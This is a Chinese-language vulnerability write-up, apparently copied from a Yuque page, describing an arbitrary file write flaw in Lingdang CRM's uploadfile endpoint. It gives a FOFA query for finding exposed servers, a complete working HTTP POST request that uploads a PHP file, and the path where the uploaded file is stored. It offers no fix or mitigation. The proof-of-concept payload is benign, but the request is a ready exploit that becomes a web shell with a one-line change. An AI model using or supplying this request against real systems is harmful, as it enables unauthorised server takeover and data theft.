# 灵当crm uploadfile存在文件写入漏洞

# 一、漏洞简介
灵当CRM 是一款企业级客户关系管理软件。它旨在帮助企业管理客户信息、销售流程、市场营销活动和客户服务等。灵当crm存在任意文件写入漏洞，攻击者可以通过该漏洞写入恶意文件获取服务器权限。

# 二、影响版本
+ 灵当crm

# 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"`
+ 特征

![1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a.png](./img/zbtgoiC2mvDmPJa-/1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a-405288.png)

# 四、漏洞复现
```plain
POST /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

file_info={"name":"1.php"}&<?php echo(md5(233));unlink(__FILE__);?>
```

![1722999883677-c325fb74-5f58-4e4e-814f-8ea774b13e7f.png](./img/zbtgoiC2mvDmPJa-/1722999883677-c325fb74-5f58-4e4e-814f-8ea774b13e7f-699951.png)

```plain
/crm/storage/2024/August/week1/172299960228103.php
```

![1722999942783-ec8ba7e2-6600-4657-8fea-321871ee93a1.png](./img/zbtgoiC2mvDmPJa-/1722999942783-ec8ba7e2-6600-4657-8fea-321871ee93a1-443569.png)



> 更新: 2024-10-21 11:49:37  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/oaxy831ru4asisru>